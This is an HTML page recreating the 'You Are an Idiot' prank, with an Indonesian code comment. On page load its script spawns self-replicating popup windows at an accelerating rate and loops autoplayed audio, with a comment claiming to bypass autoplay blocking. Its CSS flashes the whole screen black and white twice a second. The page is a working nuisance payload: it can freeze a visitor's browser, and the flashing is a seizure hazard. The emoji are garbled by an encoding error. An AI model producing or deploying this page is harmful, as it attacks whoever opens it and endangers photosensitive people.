<!DOCTYPE html>
<html>
<head>
  <title>YOU ARE AN IDIOT</title>
  <style>
    body {
      text-align: center;
      font-family: "Comic Sans MS", sans-serif;
      font-size: 40px;
      margin-top: 100px;
      background-color: white;
      color: black;
      animation: flash 0.5s infinite;
    }

    @keyframes flash {
      0% { background-color: white; color: black; }
      50% { background-color: black; color: white; }
      100% { background-color: white; color: black; }
    }

    .smiley {
      font-size: 60px;
      margin: 20px;
      display: inline-block;
    }
  </style>
</head>
<body>
  <div>you are an idiot</div>
  <div>

    <div class="smiley">ðŸ˜Š</div>
    <div class="smiley">ðŸ˜Š</div>
  </div>

  <audio id="audio" autoplay loop>
    <source src="https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3" type="audio/mpeg">
  </audio>

  <script>
    // Buka tab baru terus menerus
    let count = 0;
    function openWindow() {
      count++;
      if (count < 100) {
        window.open(window.location.href, "_blank", "width=400,height=400");
        setTimeout(openWindow, 800 - count * 6); // makin cepat
      }
    }

    window.onload = function () {
      const audio = document.getElementById("audio");
      audio.play().catch(() => {}); // bypass autoplay block
      openWindow();
    };
  </script>
</body>
